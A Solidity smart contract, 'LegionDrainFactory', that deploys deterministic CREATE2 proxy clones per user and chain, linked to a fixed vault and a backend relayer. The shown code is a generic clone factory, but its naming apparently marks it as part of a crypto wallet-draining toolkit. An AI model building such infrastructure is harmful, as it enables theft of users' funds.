// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import "./LegionDrainImplementation.sol";

/**
 * LegionDrainFactory — CREATE2 deterministic clone per user per chain.
 * Salt = keccak256(abi.encodePacked(user, chainId)).
 */
library CloneLib {
    function cloneDeterministic(address implementation, bytes32 salt) internal returns (address instance) {
        assembly {
            let m := mload(0x40)
            mstore(m, 0x3d602d80600a3d3981f3363d3d373d3d3d363d73)
            mstore(add(m, 0x14), shl(0x60, implementation))
            mstore(add(m, 0x28), 0x5af43d82803e903d91602b57fd5bf3)
            instance := create2(0, add(m, 0x0b), 0x37, salt)
            if iszero(instance) { revert(0, 0) }
        }
    }

    function predictDeterministic(address implementation, bytes32 salt, address deployer)
        internal
        pure
        returns (address predicted)
    {
        assembly {
            let m := mload(0x40)
            mstore(m, 0x3d602d80600a3d3981f3363d3d373d3d3d363d73)
            mstore(add(m, 0x14), shl(0x60, implementation))
            mstore(add(m, 0x28), 0x5af43d82803e903d91602b57fd5bf3)
            let bytecodeHash := keccak256(add(m, 0x0b), 0x37)
            mstore(m, 0xff)
            mstore(add(m, 0x21), deployer)
            mstore(add(m, 0x35), salt)
            mstore(add(m, 0x55), bytecodeHash)
            predicted := and(keccak256(m, 0x75), 0xffffffffffffffffffffffffffffffffffffffff)
        }
    }
}

contract LegionDrainFactory {
    address public immutable implementation;
    address public immutable vault;
    address public relayer;

    event CloneDeployed(address indexed user, address indexed clone, uint256 chainId);
    event RelayerUpdated(address indexed relayer);

    error NotRelayer();
    error DeployFailed();

    constructor(address _vault) {
        implementation = address(new LegionDrainImplementation(_vault));
        vault = _vault;
        relayer = msg.sender;
    }

    modifier onlyRelayer() {
        if (msg.sender != relayer) revert NotRelayer();
        _;
    }

    function setRelayer(address _relayer) external onlyRelayer {
        relayer = _relayer;
        emit RelayerUpdated(_relayer);
    }

    function saltFor(address user) public view returns (bytes32) {
        return keccak256(abi.encodePacked(user, block.chainid));
    }

    function predictAddress(address user) external view returns (address) {
        return CloneLib.predictDeterministic(implementation, saltFor(user), address(this));
    }

    /// @notice Relayer-sponsored deploy — backend pays gas
    function deployFor(address user) external onlyRelayer returns (address clone) {
        bytes32 salt = saltFor(user);
        address predicted = CloneLib.predictDeterministic(implementation, salt, address(this));
        if (predicted.code.length > 0) return predicted;
        clone = CloneLib.cloneDeterministic(implementation, salt);
        if (clone == address(0)) revert DeployFailed();
        emit CloneDeployed(user, clone, block.chainid);
    }

    /// @notice User can self-deploy (pays gas) if relayer unavailable
    function deployForSelf() external returns (address clone) {
        bytes32 salt = saltFor(msg.sender);
        address predicted = CloneLib.predictDeterministic(implementation, salt, address(this));
        if (predicted.code.length > 0) return predicted;
        clone = CloneLib.cloneDeterministic(implementation, salt);
        if (clone == address(0)) revert DeployFailed();
        emit CloneDeployed(msg.sender, clone, block.chainid);
    }
}
